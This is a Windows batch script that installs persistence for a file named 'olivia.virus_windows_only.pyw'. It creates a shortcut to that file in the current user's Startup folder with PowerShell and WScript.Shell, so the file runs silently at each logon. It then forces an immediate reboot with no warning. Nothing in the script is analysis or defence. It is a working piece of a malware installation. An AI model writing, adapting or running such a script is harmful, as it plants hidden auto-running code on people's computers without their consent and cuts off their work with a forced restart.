@echo off
set "shortcutName=Olivia_shortcut"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcut=%shortcutPath%\%shortcutName%.lnk"
set "target=olivia.virus_windows_only.pyw"
set "targetPath=%~dp0"
set "targetFile=%targetPath%%target%"

if not exist "%shortcutPath%" md "%shortcutPath%"

if exist "%targetFile%" (
    echo Found "%target%" in "%targetPath%"
    echo Creating shortcut for "%targetFile%" in "%shortcutPath%"...
    powershell.exe -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%shortcut%'); $Shortcut.TargetPath = '%targetFile%'; $Shortcut.Save()"
    echo Shortcut created for "%targetFile%" in "%shortcutPath%".
) else (
    echo Cannot find "%target%" in "%targetPath%". Shortcut not created.
)

shutdown -r -t 0

Pause